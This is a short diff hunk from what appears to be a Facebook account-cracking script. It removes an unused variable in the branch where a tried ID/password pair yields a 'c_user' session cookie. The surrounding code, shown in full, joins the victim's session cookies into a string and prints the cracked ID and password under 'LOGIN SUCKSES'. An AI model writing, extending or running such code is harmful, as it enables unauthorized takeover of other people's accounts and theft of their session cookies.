@@ -1113,7 +1113,6 @@ def _async(idf,pwv):
                 break	
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok+=1
-                coki=ses.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 tree = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                 tree.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green] {tahun(idf)} ",style=f"white"))
